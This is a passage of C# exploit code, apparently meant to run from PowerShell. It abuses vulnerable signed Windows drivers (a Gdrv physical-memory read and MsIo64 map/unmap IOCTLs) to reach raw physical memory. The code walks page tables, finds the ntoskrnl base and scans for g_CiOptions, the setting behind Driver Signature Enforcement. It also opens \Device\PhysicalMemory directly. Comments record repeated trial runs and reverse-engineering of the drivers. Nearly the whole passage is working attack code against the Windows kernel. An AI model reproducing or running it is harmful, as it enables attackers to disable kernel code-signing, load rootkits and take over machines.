        pa = (e & 0x000FFFFFFFFFF000UL) + (va & 0xFFFUL);
        return true;
    }

    // The ntoskrnl *virtual* base: the 2 MiB VA in the kernel range whose
    // translation lands on the physical image we found.  Also cross-checks
    // SizeOfImage, so a wrong CR3 cannot pass.
    public static string FindKernelVa(IntPtr g, ulong cr3, ulong ntphys, uint sizeOfImage,
                                      out ulong vaBase)
    {
        vaBase = 0;
        for (ulong va = 0xFFFFF80000000000UL; va < 0xFFFFF88000000000UL; va += 0x200000)
        {
            ulong pa;
            if (!Walk(g, cr3, va, out pa)) continue;
            if (pa != ntphys) continue;
            byte[] hdr = GdrvRead(g, pa, 0x400);
            if (hdr[0] != 0x4D || hdr[1] != 0x5A) continue;
            uint e_lfanew = BitConverter.ToUInt32(hdr, 0x3C);
            if (e_lfanew + 0x100 > 0x400) continue;
            uint sz = BitConverter.ToUInt32(hdr, (int)e_lfanew + 0x18 + 0x38);
            if (sz != sizeOfImage) continue;
            vaBase = va;
            return "1";
        }
        return "";
    }

    // g_CiOptions is not exported: find the only `mov dword [rip+disp32], IMM`
    // whose target currently holds IMM (0x0E/0x06 = DSE enabled shapes).
    public static string FindCiOptions(IntPtr g, ulong cr3, ulong vaBase, ulong physBase,
                                       uint sizeOfImage, out string report)
    {
        report = "";
        int found = 0;
        for (uint off = 0; off + 0x1000 <= sizeOfImage; off += 0x1000)
        {
            byte[] b = GdrvRead(g, physBase + off, 0x1000);
            for (int i = 0; i + 10 <= 0x1000; i++)
            {
                if (b[i] != 0xC7 || b[i + 1] != 0x05) continue;
                uint imm = BitConverter.ToUInt32(b, i + 6);
                if (imm != 0x0E && imm != 0x06 && imm != 0x02 && imm != 0x0D) continue;
                int disp = BitConverter.ToInt32(b, i + 2);
                ulong instrVa = vaBase + off + (ulong)i;
                ulong targetVa = instrVa + 7 + (ulong)(long)disp;
                ulong tpa;
                if (!Walk(g, cr3, targetVa, out tpa)) continue;
                uint cur = RdD(g, tpa);
                string tag = (cur == imm) ? "  <== SELF-CONSISTENT" : "";
                report += string.Format("  instrVa=0x{0:x} writes=0x{1:x2} -> targetVa=0x{2:x} targetPa=0x{3:x} current=0x{4:x8}{5}\r\n",
                                        instrVa, imm, targetVa, tpa, cur, tag);
                found++;
                if (found >= 12) return found.ToString();
            }
        }
        return found.ToString();
    }
    // MsIo64 0x80102040 with the shape implied by the unmap handler's
    // ProbeForRead/ProbeForWrite(q1, q0, 4) pair in temp\drv\msio_1500.txt:
    //   q0 = length of a user in/out block, q1 = pointer to that block
    //   (phys/size in, view/handle out), q2..q4 driver-owned.
    // layout 0 = {phys, size}, layout 1 = {size, phys} inside the user block.
    public static string MsIoMapTry2(IntPtr h, int layout, ulong pa, uint size, ulong q0len,
                                     out uint err, out string detail)
    {
        err = 0; detail = "";
        IntPtr inb = Marshal.AllocHGlobal(0x40);
        // 4 KiB user block: the driver writes the view/handle back into q1 and three
        // powershell.exe c0000374 (STATUS_HEAP_CORRUPTION) crashes on 01/11 17:2x
        // came from a 0x80-byte HEAP block being written past its end.
        IntPtr ub = Marshal.AllocHGlobal(0x1000);
        try
        {
            for (int i = 0; i < 0x40; i++) Marshal.WriteByte(inb, i, 0);
            for (int i = 0; i < 0x1000; i++) Marshal.WriteByte(ub, i, 0);
            if (layout == 0) { Marshal.WriteInt64(ub, 0, (long)pa); Marshal.WriteInt64(ub, 8, size); }
            else { Marshal.WriteInt64(ub, 0, size); Marshal.WriteInt64(ub, 8, (long)pa); }
            Marshal.WriteInt64(inb, 0, (long)q0len);
            Marshal.WriteInt64(inb, 8, ub.ToInt64());
            uint got;
            bool ok = DeviceIoControl(h, 0x80102040, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            byte[] ib = new byte[0x28]; Marshal.Copy(inb, ib, 0, 0x28);
            byte[] ubb = new byte[0x1000]; Marshal.Copy(ub, ubb, 0, 0x1000);
            detail = "ctl=" + Hex(ib) + " user=" + Hex(ubb);
            return (ok ? "OK" : "FAIL err=" + err) + " layout" + layout + " q0=0x" + q0len.ToString("x");
        }
        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(ub); }
    }

    public static string MsIoUnmapTry(IntPtr h, ulong q0, ulong q1, ulong q2, ulong q3, ulong q4,
                                      out uint err)
    {
        err = 0;
        IntPtr inb = Marshal.AllocHGlobal(0x28);
        try
        {
            for (int i = 0; i < 0x28; i++) Marshal.WriteByte(inb, i, 0);
            Marshal.WriteInt64(inb, 0x00, (long)q0);
            Marshal.WriteInt64(inb, 0x08, (long)q1);
            Marshal.WriteInt64(inb, 0x10, (long)q2);
            Marshal.WriteInt64(inb, 0x18, (long)q3);
            Marshal.WriteInt64(inb, 0x20, (long)q4);
            uint got;
            bool ok = DeviceIoControl(h, 0x80102044, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            return ok ? ("OK info=" + got) : ("FAIL err=" + err);
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // MsIo64 0x80102040 -- TRUE input shape, from the full worker-0x1090 RE
    // (temp\drv\annot_MsIo64.txt):  in = { q0 = view length (driver caps it at 4!),
    // q1 = user VA whose LOW 32 BITS are the PHYSICAL ADDRESS to map, q2/q3/q4 = 0
    // in -> out: section handle / view base VA in OUR process / section object }.
    // The driver ZwOpenSection's \Device\PhysicalMemory with kernel PreviousMode
    // (the usermode DACL that kills W1 does not apply), then ZwMapViewOfSection(
    // handle, -1 /*current process*/, ..., SectionOffset=low32(q1),
    // ViewSize=min(q0,4), PAGE_READWRITE|NOCACHE).  Worker 0x10aa..0x10d0 also
    // range-checks low32(q1) in [G, G+0x10000000) of a driver global (image offset
    // 0x3150) -- outside it the call dies with STATUS_ACCESS_DENIED (win32 err 5),
    // which is exactly what p36 run 1's try2 saw.  G is not known statically, so
    // the caller sweeps PAs and the OK-vs-err5 pattern reveals the window.
    // q1 must ALSO be a valid user VA (map handler ProbeForRead/Write(q1, q0, 4)),
    // so we VirtualAlloc a region at the 64 KiB-aligned base covering pa and pass
    // pa itself as q1: low32(q1) == pa, and the VA is readable/writable.
    public static string MsIoMapTry3(IntPtr h, ulong pa, uint size, out uint err,
                                     out ulong viewBase, out ulong oq2, out ulong oq4)
    {
        err = 0; viewBase = 0; oq2 = 0; oq4 = 0;
        if (size > 4) size = 4;
        ulong region = pa & ~0xFFFFul;
        IntPtr va = VirtualAlloc(new IntPtr((long)region), new IntPtr(0x20000),
                                0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
        if (va == IntPtr.Zero)
            return "alloc@0x" + region.ToString("x") + " FAIL err=" + Marshal.GetLastWin32Error();
        try
        {
            IntPtr inb = Marshal.AllocHGlobal(0x28);
            try
            {
                for (int i = 0; i < 0x28; i++) Marshal.WriteByte(inb, i, 0);
                Marshal.WriteInt64(inb, 0x00, (long)size);
                Marshal.WriteInt64(inb, 0x08, (long)pa);
                uint got;
                bool ok = DeviceIoControl(h, 0x80102040, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
                err = (uint)Marshal.GetLastWin32Error();
                oq2 = (ulong)Marshal.ReadInt64(inb, 0x10);
                viewBase = (ulong)Marshal.ReadInt64(inb, 0x18);
                oq4 = (ulong)Marshal.ReadInt64(inb, 0x20);
                return (ok ? "OK" : "FAIL err=" + err) + " pa=0x" + pa.ToString("x");
            }
            finally { Marshal.FreeHGlobal(inb); }
        }
        finally { VirtualFree(va, IntPtr.Zero, 0x8000 /* MEM_RELEASE */); }
    }

    // ---- try3 helpers: region lifetime OUTSIDE the map call -------------------
    // The 0x80102044 unmap handler re-probes q1 (ProbeForRead/Write(q1,q0,4)),
    // so the user VA covering pa must stay alive across map AND unmap.  try3
    // freeing the region in its own finally was the err=998 trap.  The correct
    // span is: MsIoRegionAlloc -> MsIoMapTry4 -> (verify/write) -> MsIoUnmapTry
    // -> MsIoRegionFree.
    public static string MsIoRegionAlloc(ulong pa, out IntPtr va)
    { return MsIoRegionAt(0, pa, out va); }

    // Region at an arbitrary VA base: q1 must be a user VA whose LOW32 is the PA
    // (the driver uses low32(q1) as SectionOffset), and its full 64-bit value must
    // fall inside the driver's [G, G+0x10000000) window.  Every VA below 4 GB is
    // err=5, so G has to be >= 4 GB - alloc at G + (pa & ~0xFFFF).
    public static string MsIoRegionAt(ulong baseVa, ulong pa, out IntPtr va)
    {
        ulong region = baseVa + (pa & ~0xFFFFul);
        va = VirtualAlloc(new IntPtr((long)region), new IntPtr(0x20000),
                          0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
        if (va == IntPtr.Zero)
            return "alloc@0x" + region.ToString("x") + " FAIL err=" + Marshal.GetLastWin32Error();
        return "";
    }

    public static void MsIoRegionFree(IntPtr va)
    {
        if (va != IntPtr.Zero) VirtualFree(va, IntPtr.Zero, 0x8000 /* MEM_RELEASE */);
    }

    // MsIoMapTry3 body WITHOUT the region lifetime: the caller holds a
    // MsIoRegionAlloc region covering pa for the whole map..unmap span.
    public static string MsIoMapTry4(IntPtr h, ulong pa, uint size, out uint err,
                                     out ulong viewBase, out ulong oq2, out ulong oq4)
    {
        err = 0; viewBase = 0; oq2 = 0; oq4 = 0;
        if (size > 4) size = 4;
        IntPtr inb = Marshal.AllocHGlobal(0x28);
        try
        {
            for (int i = 0; i < 0x28; i++) Marshal.WriteByte(inb, i, 0);
            Marshal.WriteInt64(inb, 0x00, (long)size);
            Marshal.WriteInt64(inb, 0x08, (long)pa);
            uint got;
            bool ok = DeviceIoControl(h, 0x80102040, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            oq2 = (ulong)Marshal.ReadInt64(inb, 0x10);
            viewBase = (ulong)Marshal.ReadInt64(inb, 0x18);
            oq4 = (ulong)Marshal.ReadInt64(inb, 0x20);
            return (ok ? "OK" : "FAIL err=" + err) + " pa=0x" + pa.ToString("x");
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // Open \Device\PhysicalMemory with an explicit access mask (the p36 run
    // proved SeLockMemoryPrivilege is ABSENT from an elevated token here, so the
    // mask matters and all of them must be attempted).
    public static string PhysMemOpenMask(uint mask, out IntPtr section,
                                         out string privStatus)
    { return PhysMemOpenNamed(@"\Device\PhysicalMemory", mask, out section, out privStatus); }

    // Same open with an explicit object name - the 12:27 SYSTEM run returned
    // 0xC0000022 for every mask on \Device\PhysicalMemory even with the privilege
    // enabled ("ok"), so the DOS-device alias gets probed too.
    public static string PhysMemOpenNamed(string nm, uint mask, out IntPtr section,
                                          out string privStatus)
    {
        section = IntPtr.Zero;
        privStatus = EnablePriv("SeLockMemoryPrivilege");
        IntPtr nameBuf = Marshal.StringToHGlobalUni(nm);
        IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
        try
        {
            UNICODE_STRING us = new UNICODE_STRING();
            us.Length = (ushort)(nm.Length * 2);
            us.MaxLen = (ushort)((nm.Length + 1) * 2);
            us.Buffer = nameBuf;
            Marshal.StructureToPtr(us, usBuf, false);
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
            oa.Name = usBuf;
            oa.Attributes = OBJ_CASE_INSENSITIVE;
            IntPtr s;
            int st = NtOpenSection(out s, mask, ref oa);
            if (st < 0) return string.Format("mask=0x{0:x} st=0x{1:x8}", mask, st);
            section = s;
            return string.Format("mask=0x{0:x} ok handle=0x{1:x}", mask, s.ToInt64());
        }
        finally
        {
            Marshal.FreeHGlobal(nameBuf);
            Marshal.FreeHGlobal(usBuf);
        }
    }
// _END_
}
